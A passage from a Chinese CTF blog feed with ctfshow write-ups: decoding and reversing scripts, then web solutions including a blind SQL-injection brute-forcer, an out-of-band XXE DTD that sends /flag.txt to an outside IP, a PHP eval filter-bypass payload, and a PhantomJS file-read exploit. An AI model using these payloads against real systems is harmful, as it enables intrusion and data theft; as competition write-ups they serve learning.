black.png</code>，得到一个<code>3965.zip</code>,以<code>yurenjie</code>为密码解压，得到<code>flag.png</code></p>\n<p>打开图片，很容易发现高不对，于是010修改高，得到flag</p>\n<p><code>ctfshow{Th1s_i5_f1ag}</code></p>\n<h2 id=\"哇库哇库2\"><a href=\"#哇库哇库2\" class=\"headerlink\" title=\"哇库哇库2\"></a>哇库哇库2</h2><h2 id=\"琴柳感\"><a href=\"#琴柳感\" class=\"headerlink\" title=\"琴柳感\"></a>琴柳感</h2><p>官方wp后</p>\n<p>打开文本文档，一堆重复的文字。除去开头和最后的两句话，一共是四句话在重复。这里考虑也许是 Base4，不知四句话各代表什么数，于是爆破factorial(4)=24种可能。</p>\n<p>(应该是base4的编码规则)</p>\n<p>根据wp给的代码，自己简化了一下，为</p>\n<pre><code class=\"python\">'''\nAuthor       : dpm12345 1006975692@qq.com\nGithub       : https://github.com/dpm12345\nDate         : 2023-04-02 19:30:50\nLastEditors  : dpm12345 1006975692@qq.com\nLastEditTime : 2023-04-03 20:22:12\nDescription  : \n'''\n\nfrom Crypto.Util.number import long_to_bytes\nfrom itertools import permutations\nwith open(\"qlg.txt\",\"r\",encoding='gbk') as f:\n    content = f.read()\ncontent = content[8:-23]\ndic = [\"你有没有感受到城市在分崩离析？\",\"你不曾注意阴谋得逞者在狞笑。\",\"你有没有听见孩子们的悲鸣？\",\"你是否想过......朋友不再是朋友，家园不再是家园。\"]\n\ns = list(permutations(['0','1','2','3']))\nfor a,b,c,d in s:\n    tmp1 = content.replace(dic[0],a).replace(dic[1],b).replace(dic[2],c).replace(dic[3],d)\n    tmp2 = 0\n    for i in tmp1:\n        tmp2 &lt;&lt;= 2\n        tmp2+=int(i)\n    print(long_to_bytes(tmp2))\n\n'''\nb'\\x1b2\\x11;\\x16\\x1f376\\x14\\x1d\\x13\\x190\\x1b\\x10\\x1d\\x136\\x14\\x1d\\x13\\x0f4\\x14\\x1905\\x18\\x144\\x14\\x0f5\\x18\\x14\\x17\\x10\\x1e\\x14\\x18\\x1d4\\x14\\x1e\\x14\\x18\\x1d\\x19\\x18&lt;'\nb'\\x1e#\\x11.\\x17\\x1a\"&amp;\\'\\x14\\x19\\x12\\x1d \\x1e\\x10\\x19\\x12\\'\\x14\\x19\\x12\\n$\\x14\\x1d %\\x1c\\x14$\\x14\\n%\\x1c\\x14\\x16\\x10\\x1b\\x14\\x1c\\x19$\\x14\\x1b\\x14\\x1c\\x19\\x1d\\x1c('\nb'\\'1\"7)/3;9(.#&amp;0\\' .#9(.#\\x0f8(&amp;0:$(8(\\x0f:$(+ -($.8(-($.&amp;$&lt;'\nb'-\\x13\"\\x1d+%\\x11\\x19\\x1b(&amp;!.\\x10- &amp;!\\x1b(&amp;!\\x05\\x18(.\\x10\\x1a,(\\x18(\\x05\\x1a,() \\'(,&amp;\\x18(\\'(,&amp;.,\\x14'\nb'6!3&amp;=:\".-&lt;;27 60;2-&lt;;2\\n,&lt;7 /4&lt;,&lt;\\n/4&lt;&gt;09&lt;4;,&lt;9&lt;4;74('\nb'9\\x123\\x19&gt;5\\x11\\x1d\\x1e&lt;71;\\x109071\\x1e&lt;71\\x05\\x1c&lt;;\\x10\\x1f8&lt;\\x1c&lt;\\x05\\x1f8&lt;=06&lt;87\\x1c&lt;6&lt;87;8\\x14'\nb'KvD{BOwsrALGHuKELGrALG_qAHupIAqA_pIACENAILqANAILHI}'\nb'NgDnCJfbcAHFLeNEHFcAHFZaALe`MAaAZ`MABEKAMHaAKAMHLMi'\nb'ctfshow{xingbucengxing_yibuzaiyi_zaikelianyilianba}'\nb'lGfLk`DHKibdnElebdKibdPIinEJmiIiPJmihecimbIicimbnmA'\nb'rdwb|zfnl}{vseru{vl}{vZm}seoq}m}Zoq}~ux}q{m}x}q{sqi'\nb'xFwH~pDLN}st{ExustN}stPM}{EOy}M}POy}|ur}ysM}r}ys{yA'\nb'\\x87\\xb9\\x88\\xb7\\x81\\x8f\\xbb\\xb3\\xb1\\x82\\x8c\\x8b\\x84\\xba\\x87\\x8a\\x8c\\x8b\\xb1\\x82\\x8c\\x8b\\xaf\\xb2\\x82\\x84\\xba\\xb0\\x86\\x82\\xb2\\x82\\xaf\\xb0\\x86\\x82\\x83\\x8a\\x8d\\x82\\x86\\x8c\\xb2\\x82\\x8d\\x82\\x86\\x8c\\x84\\x86\\xbe'\nb'\\x8d\\x9b\\x88\\x9d\\x83\\x85\\x99\\x91\\x93\\x82\\x84\\x89\\x8c\\x9a\\x8d\\x8a\\x84\\x89\\x93\\x82\\x84\\x89\\xa5\\x92\\x82\\x8c\\x9a\\x90\\x8e\\x82\\x92\\x82\\xa5\\x90\\x8e\\x82\\x81\\x8a\\x87\\x82\\x8e\\x84\\x92\\x82\\x87\\x82\\x8e\\x84\\x8c\\x8e\\x96'\nb'\\x93\\xb8\\x99\\xb3\\x94\\x9f\\xbb\\xb7\\xb4\\x96\\x9d\\x9b\\x91\\xba\\x93\\x9a\\x9d\\x9b\\xb4\\x96\\x9d\\x9b\\xaf\\xb6\\x96\\x91\\xba\\xb5\\x92\\x96\\xb6\\x96\\xaf\\xb5\\x92\\x96\\x97\\x9a\\x9c\\x96\\x92\\x9d\\xb6\\x96\\x9c\\x96\\x92\\x9d\\x91\\x92\\xbe'\nb'\\x9c\\x8b\\x99\\x8c\\x97\\x90\\x88\\x84\\x87\\x96\\x91\\x98\\x9d\\x8a\\x9c\\x9a\\x91\\x98\\x87\\x96\\x91\\x98\\xa0\\x86\\x96\\x9d\\x8a\\x85\\x9e\\x96\\x86\\x96\\xa0\\x85\\x9e\\x96\\x94\\x9a\\x93\\x96\\x9e\\x91\\x86\\x96\\x93\\x96\\x9e\\x91\\x9d\\x9e\\x82'\nb'\\xb1\\x98\\xbb\\x91\\xbc\\xb5\\x99\\x9d\\x9c\\xbe\\xb7\\xb9\\xb3\\x9a\\xb1\\xba\\xb7\\xb9\\x9c\\xbe\\xb7\\xb9\\xa5\\x9e\\xbe\\xb3\\x9a\\x9f\\xb2\\xbe\\x9e\\xbe\\xa5\\x9f\\xb2\\xbe\\xbd\\xba\\xb4\\xbe\\xb2\\xb7\\x9e\\xbe\\xb4\\xbe\\xb2\\xb7\\xb3\\xb2\\x96'\nb'\\xb4\\x89\\xbb\\x84\\xbd\\xb0\\x88\\x8c\\x8d\\xbe\\xb3\\xb8\\xb7\\x8a\\xb4\\xba\\xb3\\xb8\\x8d\\xbe\\xb3\\xb8\\xa0\\x8e\\xbe\\xb7\\x8a\\x8f\\xb6\\xbe\\x8e\\xbe\\xa0\\x8f\\xb6\\xbe\\xbc\\xba\\xb1\\xbe\\xb6\\xb3\\x8e\\xbe\\xb1\\xbe\\xb6\\xb3\\xb7\\xb6\\x82'\nb'\\xc6\\xed\\xcc\\xe6\\xc1\\xca\\xee\\xe2\\xe1\\xc3\\xc8\\xce\\xc4\\xef\\xc6\\xcf\\xc8\\xce\\xe1\\xc3\\xc8\\xce\\xfa\\xe3\\xc3\\xc4\\xef\\xe0\\xc7\\xc3\\xe3\\xc3\\xfa\\xe0\\xc7\\xc3\\xc2\\xcf\\xc9\\xc3\\xc7\\xc8\\xe3\\xc3\\xc9\\xc3\\xc7\\xc8\\xc4\\xc7\\xeb'\nb'\\xc9\\xde\\xcc\\xd9\\xc2\\xc5\\xdd\\xd1\\xd2\\xc3\\xc4\\xcd\\xc8\\xdf\\xc9\\xcf\\xc4\\xcd\\xd2\\xc3\\xc4\\xcd\\xf5\\xd3\\xc3\\xc8\\xdf\\xd0\\xcb\\xc3\\xd3\\xc3\\xf5\\xd0\\xcb\\xc3\\xc1\\xcf\\xc6\\xc3\\xcb\\xc4\\xd3\\xc3\\xc6\\xc3\\xcb\\xc4\\xc8\\xcb\\xd7'\nb'\\xd2\\xec\\xdd\\xe2\\xd4\\xda\\xee\\xe6\\xe4\\xd7\\xd9\\xde\\xd1\\xef\\xd2\\xdf\\xd9\\xde\\xe4\\xd7\\xd9\\xde\\xfa\\xe7\\xd7\\xd1\\xef\\xe5\\xd3\\xd7\\xe7\\xd7\\xfa\\xe5\\xd3\\xd7\\xd6\\xdf\\xd8\\xd7\\xd3\\xd9\\xe7\\xd7\\xd8\\xd7\\xd3\\xd9\\xd1\\xd3\\xeb'\nb'\\xd8\\xce\\xdd\\xc8\\xd6\\xd0\\xcc\\xc4\\xc6\\xd7\\xd1\\xdc\\xd9\\xcf\\xd8\\xdf\\xd1\\xdc\\xc6\\xd7\\xd1\\xdc\\xf0\\xc7\\xd7\\xd9\\xcf\\xc5\\xdb\\xd7\\xc7\\xd7\\xf0\\xc5\\xdb\\xd7\\xd4\\xdf\\xd2\\xd7\\xdb\\xd1\\xc7\\xd7\\xd2\\xd7\\xdb\\xd1\\xd9\\xdb\\xc3'\nb'\\xe1\\xdc\\xee\\xd1\\xe8\\xe5\\xdd\\xd9\\xd8\\xeb\\xe6\\xed\\xe2\\xdf\\xe1\\xef\\xe6\\xed\\xd8\\xeb\\xe6\\xed\\xf5\\xdb\\xeb\\xe2\\xdf\\xda\\xe3\\xeb\\xdb\\xeb\\xf5\\xda\\xe3\\xeb\\xe9\\xef\\xe4\\xeb\\xe3\\xe6\\xdb\\xeb\\xe4\\xeb\\xe3\\xe6\\xe2\\xe3\\xd7'\nb'\\xe4\\xcd\\xee\\xc4\\xe9\\xe0\\xcc\\xc8\\xc9\\xeb\\xe2\\xec\\xe6\\xcf\\xe4\\xef\\xe2\\xec\\xc9\\xeb\\xe2\\xec\\xf0\\xcb\\xeb\\xe6\\xcf\\xca\\xe7\\xeb\\xcb\\xeb\\xf0\\xca\\xe7\\xeb\\xe8\\xef\\xe1\\xeb\\xe7\\xe2\\xcb\\xeb\\xe1\\xeb\\xe7\\xe2\\xe6\\xe7\\xc3'\n\n'''\n</code></pre>\n<h2 id=\"低端的base\"><a href=\"#低端的base\" class=\"headerlink\" title=\"低端的base\"></a>低端的base</h2><p>根据base64的原理，base64是一种把二进制值变成文本数据的方式，在输入是文本的情况下，3个原始字符对应的就是4个base64编码后的字符，所以可以对编码后的base64字符4个4个的进行爆破，只要还原出来的3个原始字符在可见字符范围内即可。</p>\n<pre><code class=\"python\">from Crypto.Util.number import *\nimport itertools\nimport base64\n\nwith open(\"题目flag.txt\",\"r\",encoding=\"utf-8\") as f:\n    c = f.read()\n\nfor i in range(int(len(c)/4)):\n    s = c[i*4:i*4+4]\n    tmp = []\n    for x in s:\n        if x.isalpha():\n            tmp.append((x.lower(),x.upper()))\n        else:\n            tmp.append((x))\n    # print(tmp)\n    y = list(itertools.product(*tmp))\n    res = []\n    for q in y:\n        z = \"\".join(q)\n        try:\n            de_str = base64.b64decode(z.encode()).decode()\n            if de_str.isprintable():\n                res.append(de_str)\n        except:\n            pass\n    print(res)\n</code></pre>\n<p><code>ctfshow{base64_1s太难了!!I服了U!}</code></p>\n<h1 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h1><h2 id=\"easy-pyc\"><a href=\"#easy-pyc\" class=\"headerlink\" title=\"easy_pyc\"></a>easy_pyc</h2><p>uncomploy6反编译，得到</p>\n<pre><code class=\"python\">print 'Welcome to CTFshow Re!'\nprint 'your flag is here!'\nflag = ''\nl = len(flag)\nfor i in range(l):\n    num = ((flag[i] + i) % 114514 + 114514) % 114514\n    code += chr(num)\n\ncode = map(ord, code)\nfor i in range(l - 4 + 1):\n    code[i] = code[i] ^ code[(i + 1)]\n\nprint code\ncode = ['\\x16', '\\x1d', '\\x1e', '\\x1a', '\\x18', '\\t', b'\\xff', b'\\xd0', ',', '\\x03', '\\x02', '\\x14', '8', 'm', '\\x01', 'C', 'D', b'\\xbd', b'\\xf7', '*', '\\r', b'\\xda', b'\\xf9', '\\x1c', '&amp;', '5', \"'\", b'\\xda', b'\\xd4', b'\\xd1', '\\x0b', b'\\xc7', b'\\xc7', '\\x1a', b'\\x90', 'D', b'\\xa1']\n</code></pre>\n<p>解密脚本为</p>\n<pre><code class=\"python\">code = ['\\x16', '\\x1d', '\\x1e', '\\x1a', '\\x18', '\\t', b'\\xff', b'\\xd0', ',', '\\x03', '\\x02', '\\x14', '8', 'm', '\\x01', 'C', 'D', b'\\xbd', b'\\xf7', '*', '\\r', b'\\xda', b'\\xf9', '\\x1c', '&amp;', '5', \"'\", b'\\xda', b'\\xd4', b'\\xd1', '\\x0b', b'\\xc7', b'\\xc7', '\\x1a', b'\\x90', 'D', b'\\xa1']\nl = len(code)\nnew_code = [ord(i) for i in code]\nfor i in range(l-4,0,-1):\n    new_code[i] = new_code[i] ^ new_code[i+1]\nprint(new_code)\nfor i in range(l):\n    print(chr(new_code[i]-i),end=\"\")\n</code></pre>\n<p>由于11414过大，所以<code>num = ((flag[i] + i) % 114514 + 114514) % 114514</code>最后值仍为<code>flag[i] + i</code>，之后就是异或的逆运算</p>\n<p>得到<code>tfshow{Just_F00l's_D@y_R3_Ch3ck-in!}</code></p>\n<p>于是flag为<code>ctfshow{Just_F00l's_D@y_R3_Ch3ck-in!}</code></p>\n<h2 id=\"easy-cc\"><a href=\"#easy-cc\" class=\"headerlink\" title=\"easy_cc\"></a>easy_cc</h2><p>IDA打开，字符串窗口，找到比较输入的函数，顺着代码的变化过程，可知加密的流程为</p>\n<p>输入flag -&gt; 读取flag及计算长度 -&gt; 利用已有的”key123”对输入的每个字符进行异或操作 -&gt; 将字符转化为2位16进制代码</p>\n<p>故解密流程为： 每两位读出16进制 -&gt; 转化为10进制 -&gt; 与”key123”异或 -&gt; 得到flag</p>\n<p>解密脚本</p>\n<pre><code class=\"python\">v19 = \"key123\"\ntarget = \"08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216\"\nv17 = []\nfor i in range(0,len(target),2):\n    v17.append(int(target[i:i+2],16))\nnew_v17 = []\nfor i in range(len(v17)):\n    v17[i] = v17[i] ^ ord(v19[i % len(v19)])\nfor i in v17:\n    print(chr(i),end=\"\")\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b63ac8f1/",
            "url": "http://dpm12345.cn/posts/b63ac8f1/",
            "title": "AK赛",
            "date_published": "2022-10-04T15:25:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"签到-观己\"><a href=\"#签到-观己\" class=\"headerlink\" title=\"签到_观己\"></a>签到_观己</h2><p>nginx 日志包含</p>\n<h2 id=\"web1-观字\"><a href=\"#web1-观字\" class=\"headerlink\" title=\"web1_观字\"></a>web1_观字</h2><p>ip 地址可以使用 <code>。</code> 代替 <code>.</code></p>\n<h2 id=\"web2-观星\"><a href=\"#web2-观星\" class=\"headerlink\" title=\"web2_观星\"></a>web2_观星</h2><p>SQL 注入</p>\n<p>令<code>id=1’</code>返回<code>enheng?</code>发现<code>’</code>被过滤了，fuzz测试过滤了<code>空格、’、\"、=、like、ascii、union、order by、|、sleep、 </code>。</p>\n<p>常用的盲注payload为payload=<code>1^if (ascii (substr ('flag',1,1))=104,1,0)</code></p>\n<p>过滤了空格可以用括号代替；</p>\n<p>过滤了单引号可以用16进制代替；</p>\n<p>过滤了逗号，对于<code>substr</code>可以用<code>substr (database () from 1 for 1 )</code>代替<code>substr (database (),1,1)</code>，<code>if</code>中有逗号可以用<code>case when</code>代替<code>if</code>；</p>\n<p>过滤了<code>ascii</code>可以用<code>ord</code>代替；</p>\n<p>过滤了等号和<code>like</code>可以用<code>regexp</code>代替。</p>\n<p>这样上面的常规语句就可以转化为<br><code>id=1^case (ord (substr (database () from (1) for (1)))) when (102) then (2) else (3) end</code></p>\n<pre><code class=\"python\">import requests\nurl = \"http://a1f44411-4202-45d0-a2c2-58d491438f96.challenge.ctf.show/index.php?id=1^\"\nflag = \"\"\nfor i in range(7, 50):\n    print(\"i=\"+str(i))\n    for j in range(38, 126):\n        # u=\"case (ord (substr (database () from ({0}) for (1)))) when ({1}) then (2) else (3) end\".format (i,j)  #库名  web1\n        # u=\"case (ord (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema) regexp (database ())) from ({0}) for (1)))) when ({1}) then (2) else (3) end\".format (i,j) #表名 flag、page、user\n        # u=\"case (ord (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name) regexp (0x666c6167)) from ({0}) for (1)))) when ({1}) then (2) else (3) end\".format (i,j) #列名 FLAG_COLUMN、flag\n        u = \"case(ord(substr((select(group_concat(flag))from(flag))from({0})for(1))))when({1})then(2)else(3)end\".format(\n            i, j)  # flag 字段\n        u = url+u\n        r = requests.get(u)\n        t = r.text\n        if(\"I asked nothing\" in t):\n            flag += chr(j)\n            print(flag)\n            break\n</code></pre>\n<h2 id=\"web3-观图\"><a href=\"#web3-观图\" class=\"headerlink\" title=\"web3_观图\"></a>web3_观图</h2><pre><code class=\"php\">&lt;?php\n\n//$key = substr(md5('ctfshow'.rand()),3,8);\n//flag in config.php\ninclude('config.php');\nif(isset($_GET['image'])){\n    $image=$_GET['image'];\n    $str = openssl_decrypt($image, 'bf-ecb', $key);\n    if(file_exists($str)){\n        header('content-type:image/gif');\n        echo file_get_contents($str);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre>\n<p><code>?image=N6bf8Bd8jm0SpmTZGl0isw==</code></p>\n<h2 id=\"web4-观心\"><a href=\"#web4-观心\" class=\"headerlink\" title=\"web4_观心\"></a>web4_观心</h2><p>点击占卜后可以发现网络模块中多了一个api.php ，查看请求数据，分别提交了api和city </p>\n<p>查阅，为xxe漏洞，在服务器上写两个文件</p>\n<p>test.xml</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n\n&lt;!DOCTYPE test [ \n\n&lt;!ENTITY % remote SYSTEM \"http://公网ip+port/test.dtd\"&gt; \n\n%remote;%int;%send; ]&gt;\n</code></pre>\n<p>test.dtd</p>\n<pre><code class=\"dtd\">&lt;!ENTITY % p1 SYSTEM \"php://filter/read=convert-base64.encode/resource=/flag.txt\"&gt;\n&lt;!ENTITY % p2 \"&lt;!ENTITY xxe SYSTEM 'http://ip/pass=%p1;'&gt;\"&gt;\n%p2;\n</code></pre>\n<p>然后访问 api.php</p>\n<p>POST 内容如下</p>\n<pre><code class=\"raw\">api=http:// 公网 ip+port/test.xml&amp;city=\n</code></pre>\n<p>最后可以看到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/AK%E8%B5%9B_web_%E8%A7%82%E5%BF%83_1.jpg\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/26d2b0d0/",
            "url": "http://dpm12345.cn/posts/26d2b0d0/",
            "title": "36D杯",
            "date_published": "2022-10-04T15:22:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"给你-shell\"><a href=\"#给你-shell\" class=\"headerlink\" title=\"给你 shell\"></a>给你 shell</h2><p>进入后查看源码，可以发现标签</p>\n<pre><code class=\"html\">&lt;a href='[./?view_source](http://dc592659-7387-4929-80b9-ebd1efabecf7.challenge.ctf.show/?view_source)' target=\"_blank\"&gt;&lt;button hidden&gt;&lt;/button&gt;&lt;/a&gt;\n</code></pre>\n<p>点击，挑战到源码界面</p>\n<pre><code class=\"php\">&lt;?php\n//It's no need to use scanner. Of course if you want, but u will find nothing.\nerror_reporting(0);\ninclude \"config.php\";\n\nif (isset($_GET['view_source'])) {\n    show_source(__FILE__);\n    die;\n}\n\nfunction checkCookie($s) {\n    $arr = explode(':', $s);\n    if ($arr[0] === '{\"secret\"' &amp;&amp; preg_match('/^[\\\"0-9A-Z]*}$/', $arr[1]) &amp;&amp; count($arr) === 2 ) {\n        return true;\n    } else {\n        if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1);\n        return false;\n    }\n}\n\nfunction haveFun($_f_g) {\n    $_g_r = 32;\n    $_m_u = md5($_f_g);\n    $_h_p = strtoupper($_m_u);\n    for ($i = 0; $i &lt; $_g_r; $i++) {\n        $_i = substr($_h_p, $i, 1);\n        $_i = ord($_i);\n        print_r($_i &amp; 0xC0);\n    }\n    die;\n}\n\nisset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '{\"secret\":\"' . strtoupper(md5('y1ng')) . '\"}', time()+7200 );\ncheckCookie($json) ? $obj = @json_decode($json, true) : die('no');\n\nif ($obj &amp;&amp; isset($_GET['give_me_shell'])) {\n    ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo \"here is your webshell: $shell_path\";\n}\n\ndie;\n</code></pre>\n<p>由该代码可知是为了获得webshell的地址，即要使得<code>$obj['secret'] != $flag_md5</code>为false，但在前后并无发现关于flag的信息，唯一能获取的是即为后面的<code>haveFun($flag)</code>函数，有该函数本体代码，可以知道每一位flag的ascii码值<code>与操作</code>0的值。（这里有个知识点，小于65的数与0为0，64-127与0为64）。而在64-127的ascii里均不为数字，而在MD5值和函数转大写，只有数字和大写字母。所以可根据打印结果判断md5的数据组成。</p>\n<p>在<code>$obj['secret'] != $flag_md5</code>的判断中，为弱等于，所以不用知道<code>flag_md5</code>的全部值，如果flag前几位为数字，可用弱类型比较的特性绕过。于是先随便输入一个<code>secret</code>值，得到</p>\n<pre><code class=\"raw\">0006464640064064646464006406464064640064006400000000000\n</code></pre>\n<p>即flag的md5开头三位为数字，那么传入的secret为一个三位数，可以是判断表达过绕过，进行爆破，可以得到115为正确的</p>\n<p>输入 <code>{\"secret\":115}</code> ，得到</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/ctfshow_1.jpg\"></p>\n<p>即网站 <code>w3b5HeLLlll123.php</code></p>\n<p>进入，源码</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nsession_start();\n\n\n//there are some secret waf that you will never know, fuzz me if you can\nrequire \"hidden_filter.php\";\n\n\nif (!$_SESSION['login'])\n    die('&lt;script&gt;location.href=\\'./index.php\\'&lt;/script&gt;');\n\n\nif (!isset($_GET['code'])) {\n    show_source(__FILE__);\n    exit();\n} else {\n    $code = $_GET['code'];\n    if (!preg_match($secret_waf, $code)) {\n        // 清空 session 从头再来\n        eval(\"\\$_SESSION[\" . $code . \"]=false;\"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker\n    } else die('hacker');\n}\n\n\n/*\n * When you feel that you are lost, do not give up, fight and move on.\n * Being a hacker is not easy, it requires effort and sacrifice.\n * But remember … we are legion!\n *  ————Deep CTF 2020\n*/\n</code></pre>\n<p>这里可以发现</p>\n<p>过滤了：</p>\n<pre><code class=\"raw\">0       200\tfalse\tfalse\t309\t\t//309 为黑名单里面的符号，但不一定是全部，只是符号\n2\t\"\t200\tfalse\tfalse\t309\t\n4\t$\t200\tfalse\tfalse\t309\t\n6\t&amp;\t200\tfalse\tfalse\t309\t\n7\t'\t200\tfalse\tfalse\t309\t\n8\t(\t200\tfalse\tfalse\t309\t\n9\t)\t200\tfalse\tfalse\t309\t\n10\t*\t200\tfalse\tfalse\t309\t\n15\t/\t200\tfalse\tfalse\t309\t\n18\t;\t200\tfalse\tfalse\t309\t\n25\t\\\t200\tfalse\tfalse\t309\t\n27\t^\t200\tfalse\tfalse\t309\t\n29\t`\t200\tfalse\tfalse\t309\t\n31\t|\t200\tfalse\tfalse\t309\t\n1\t!\t200\tfalse\tfalse\t303\t\n3\t#\t200\tfalse\tfalse\t303\t\n5\t%\t200\tfalse\tfalse\t303\t\n11\t+\t200\tfalse\tfalse\t303\t\n12\t,\t200\tfalse\tfalse\t303\t\n13\t-\t200\tfalse\tfalse\t303\t\n14\t.\t200\tfalse\tfalse\t303\t\n16\t\t200\tfalse\tfalse\t303\t\n17\t:\t200\tfalse\tfalse\t303\t\n19\t&lt;\t200\tfalse\tfalse\t303\t\n20\t=\t200\tfalse\tfalse\t303\t\n21\t&gt;\t200\tfalse\tfalse\t303\t\n22\t?\t200\tfalse\tfalse\t303\t\n23\t@\t200\tfalse\tfalse\t303\t\n24\t[\t200\tfalse\tfalse\t303\t\n26\t]\t200\tfalse\tfalse\t303\t\n28\t_\t200\tfalse\tfalse\t303\t\n30\t{\t200\tfalse\tfalse\t303\t\n32\t}\t200\tfalse\tfalse\t303\t\n33\t~\t200\tfalse\tfalse\t303\t\n————————————————\n版权声明：本文为 CSDN 博主「秋风瑟瑟...」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/qq_45628145/article/details/106291794\n</code></pre>\n<p>利用点为<code>eval(\"\\$_SESSION[\" . $code . \"]=false;\");</code>由<code>eval</code>的特性，可以用分号分割命令，但由于<code>;</code>被过滤，这里采用<code>?&gt;&lt;?</code>代替。所以先闭合<code>[</code>, 即<code>code=]=1</code>之后要读取前面提示的<code>/flag.txt</code> 文件，但由于引号和括号均被过滤，不能使用分号、括号、空格，即不能使用include，那么可以想到用require包含文件，由于可以使用<code>~</code>，那么可以使用该符号取反运算</p>\n<pre><code class=\"php\">&lt;?php\n$a = '/flag.txt';\n$b = urldecode(~$a);\necho urlencode($b);\n</code></pre>\n<p>得到<code>%D0%99%93%9E%98%D1%8B%87%8B</code> 那么 payload: <code>code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98%D1%8B%87%8B?&gt; </code></p>\n<p>提示</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/ctfshow_2.jpg\"># 本文作者： dpm12345 @dpm12345</p>\n<p>于是修改为 /flag</p>\n<p>得到<code>%D0%99%93%9E%98</code></p>\n<p>那么payload:<code>code=]=1?&gt;&lt;?=require~%D0%99%93%9E%98?&gt;</code></p>\n<p>得到flag</p>\n<h2 id=\"RemoteImageDownloader\"><a href=\"#RemoteImageDownloader\" class=\"headerlink\" title=\"RemoteImageDownloader\"></a>RemoteImageDownloader</h2><p>CVE-2019-17221、PhantomJS 任意文件读取</p>\n<p>首先创建<code>html</code>写入以下代码：</p>\n<pre><code class=\"html\">&lt;html&gt;\n &lt;head&gt;\n &lt;body&gt;\n &lt;script&gt;\n x=new XMLHttpRequest;\n x.onload=function(){\n document.write(this.responseText)\n };\n x.open(\"GET\",\"file:///flag\");\n x.send();\n &lt;/script&gt;\n &lt;/body&gt;\n &lt;/head&gt;\n&lt;/html&gt;\n</code></pre>\n<p>再将站点地址输入，点击<code>download</code>，下载了图片，打开后看到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/romoteImageDownload.png\"></p>\n<h2 id=\"ALL-INFO-U-WANT\"><a href=\"#ALL-INFO-U-WANT\" class=\"headerlink\" title=\"ALL_INFO_U_WANT\"></a>ALL_INFO_U_WANT</h2><p>访问index.php.bak得到源码</p>\n<pre><code class=\"PHP\">visit all_info_u_want.php and you will get all information you want\n\n= =Thinking that it may be difficult, i decided to show you the source code:\n\n\n&lt;?php\nerror_reporting(0);\n\n//give you all information you want\nif (isset($_GET['all_info_i_want'])) {\n    phpinfo();\n}\n\nif (isset($_GET['file'])) {\n    $file = \"/var/www/html/\" . $_GET['file'];\n    //really baby include\n    include($file);\n}\n\n?&gt;\n\n\n\nreally really really baby challenge right?\n</code></pre>\n<p>根据提示访问<code>all_info_u_want.php?all_info_i_want=1</code>,</p>\n<p>之后是文件读取</p>\n<p>通过<code>phpinfo ()</code>可知为 nginx，那么可以使用日志包含写一句话木马进行rce</p>\n<p>查找根目录，发现flag，读取，但是是假的，用以下命令查找</p>\n<pre><code class=\"bash\">find /etc -name \"*\" | xargs grep \"ctfshow\"\n</code></pre>\n<p>找到 flag</p>\n<h2 id=\"WUSTCTF-朴实无华-Revenge\"><a href=\"#WUSTCTF-朴实无华-Revenge\" class=\"headerlink\" title=\"WUSTCTF_朴实无华_Revenge\"></a>WUSTCTF_朴实无华_Revenge</h2><pre><code class=\"php\">&lt;?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\nfunction isPalindrome($str){\n    $len=strlen($str);\n    $l=1;\n    $k=intval($len/2)+1;\n    for($j=0;$j&lt;$k;$j++)\n        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) {\n            $l=0;\n            break;\n        }\n    if ($l==1) return true;\n    else return false;\n}\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    $numPositve = intval($num);\n    $numReverse = intval(strrev($num));\n    if (preg_match('/[^0-9.-]/', $num)) {\n        die(\"非洲欢迎你1\");\n    }\n    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) { // 在 64 位系统中 intval () 的上限不是 2147483647 省省吧\n        die(\"非洲欢迎你2\");\n    }\n    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) ){\n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\";\n    }else{\n        die(\"金钱解决不了穷人的本质问题\");\n    }\n}else{\n    die(\"去非洲吧\");\n}\n\n//level 2\nif (isset($_GET['md5'])){\n    $md5=$_GET['md5'];\n    if ($md5==md5(md5($md5)))\n        echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\";\n    else\n        die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");\n}else{\n    die(\"去非洲吧\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"36dCTFShow\", 